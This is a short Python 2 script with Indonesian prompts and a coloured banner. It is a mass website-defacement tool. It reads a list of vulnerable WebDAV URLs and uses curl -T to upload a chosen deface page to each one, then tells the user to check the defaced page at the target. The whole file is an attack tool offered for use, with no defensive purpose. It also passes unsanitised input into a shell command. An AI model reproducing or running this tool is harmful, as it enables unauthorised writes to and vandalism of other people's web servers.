# -*- coding: utf-8 -*-
import os,time

B = "\033[1;34m";
WI = "\033[2;37;40m"
YM = "\033[0;33;40m"
Y = "\033[1;33m";
WM = "\033[0;37m";
G = "\033[0;32m";
W = "\033[1;0m";
R = "\033[1;31m";
GR = "\033[0;32m"
C = "\033[1;36m";
M = "\033[0;35m";
DG ="\033[1;30m";
CM = "\033[0;36m"
NOTE = "\033[0;33m[\033[0;37mNOTE\033[0;33m] "

def wk() :
        print "\033[1;30;40m[\033[0;37;40m%s\033[1;30;40m]" % time.strftime("%X"),
os.system('clear')
os.system('toilet -f future brutdav --gay')
print R+"#)#)#)#)#)#)#)#)#)|(#(#(#(#(#(#(#(#(#"
print R+"#"+WM+" [√] "+C+"Author	"+WM+": "+YM+"XaVHaX	    "+R+"#"
print R+"#"+WM+" [√] "+C+"Team	"+WM+": "+YM+"Sicx Brother	    "+R+"#"
print R+"#"+WM+" [√] "+C+"Thanks To	"+WM+": "+YM+"Allah SWT	    "+R+"#"
print R+"#"+WM+" [√] "+C+"Thanks To	"+WM+": "+YM+"Google	    "+R+"#"
print R+"#)#)#)#)#)#)#)#)#)|(#(#(#(#(#(#(#(#(#"
print NOTE+WM+"Sebelum Pakai Program Ini"
print NOTE+WM+"Masukan url web vuln webdav nya di "+YM+"list.txt"
print WM+"Masukan Nama Script Deface Antum"
print WM+"Contoh :"+YM+" /sdcard/index.html "
print C+"/sdcard/ "+WM+"adalah tempat penyimpanan internal antum"
print C+"index.html"+WM+" adalah nama SC antum"
print ""
try :
	wk(),
	sc = raw_input(WM+"Script	: "+G)
	list = open('list.txt', 'r')
	for line in list :
		os.system('curl -T '+sc+' '+line),
		wk(),
		print WM+"Mendeface WEB "+G+line,

except EOFError :
	print "Error"

print WM+"Cara Cek "+YM+"http://www.target.com/namascript.html"
